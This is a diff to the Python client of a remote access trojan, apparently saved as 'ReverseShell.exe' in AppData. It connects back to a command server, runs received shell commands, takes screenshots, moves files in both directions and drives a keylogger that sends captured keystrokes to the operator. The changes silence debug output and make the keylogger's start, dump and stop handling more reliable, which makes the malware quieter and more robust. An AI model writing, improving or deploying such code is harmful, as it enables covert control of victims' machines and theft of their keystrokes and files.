@@ -14,6 +14,8 @@ from keylogger import keylogger
 host = ("127.0.0.1", 6666)
 location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\%username%\AppData\Roaming\ReverseShell.exe
 debug = False
+t1 = None
+
 
 def client():
     global s
@@ -22,10 +24,12 @@ def client():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect(host)
-            print("Connected to Server")
+            if debug:
+                print("Connected to Server")
             break
         except:
-            print("Connection failed, retrying in {} seconds..".format(seconds))
+            if debug:
+                print("Connection failed, retrying in {} seconds..".format(seconds))
             time.sleep(seconds)
 
 
@@ -34,7 +38,7 @@ def shell():
     while True:
         cmd = reliable_recv()
         if cmd == "exit":
-            reliable_send("exiting...")
+            reliable_send("Exiting...")
             s.close()
             return
         elif cmd.startswith("cd") and len(cmd) > 1:
@@ -57,14 +61,14 @@ def shell():
         elif cmd.startswith("isadmin"):
             is_admin()
         elif cmd.startswith("keylogger"):
-            keyloggerUtil(cmd)
+            keylogger_util(cmd)
         else:
             try:
                 proc = os.popen(cmd)  # open a process to run commands on shell
                 res = proc.read()  # command result
                 reliable_send(res)
             except Exception as e:
-                reliable_send("Unrecognized command")
+                reliable_send("[!!] Unrecognized command")
                 if debug:
                     print(e)
 
@@ -98,7 +102,7 @@ def screenshot():
         download(filename)
         os.remove(filename)
     except Exception as e:
-        reliable_send("Error taking the screenshot")
+        reliable_send("[!!] Error taking the screenshot")
         if debug:
             print(e)
 
@@ -116,7 +120,7 @@ def download_remote(cmd):
             out_file.write(response.content)
             reliable_send("Download completed")
     except Exception as e:
-        reliable_send("Download failed")
+        reliable_send("[!!] Download failed")
         if debug:
             print(e)
 
@@ -151,7 +155,7 @@ def upload(filename):
             reliable_send("Upload completed")
             return True
     except Exception as e:
-        reliable_send("Operation failed")
+        reliable_send("[!!] Operation failed")
         if debug:
             print(e)
 
@@ -201,7 +205,7 @@ def is_admin():
         return False
 
 
-def keyloggerUtil(cmd):
+def keylogger_util(cmd):
     global t1
     """
     manage keylogger util
@@ -211,15 +215,24 @@ def keyloggerUtil(cmd):
     if cmd.startswith("start"):
         t1 = threading.Thread(target=keylogger.keylogger_start)
         t1.start()
-        reliable_send("keylogger started")
+        reliable_send("Keylogger started")
     elif cmd.startswith("dump"):
-        log = keylogger.get_log()
-        reliable_send(log)
+        if t1 is not None and keylogger.is_active():
+            log = keylogger.get_log()
+            reliable_send(log)
+        else:
+            reliable_send("[!!] Keylogger is stopped")
     elif cmd.startswith("stop"):
-        os.kill(t1.native_id, 0)
-        reliable_send("keylogger stopped")
+        if t1 is not None and keylogger.is_active():
+            keylogger.keylogger_stop()
+            t1.join()
+            reliable_send("Keylogger stopped")
+        else:
+            reliable_send("[!!] Keylogger is stopped")
     else:
-        reliable_send("unkown keylogger command")
+        reliable_send("[!!] Unknown keylogger command")
+
+    print("t. count ", threading.activeCount())
 
 
 if __name__ == '__main__':
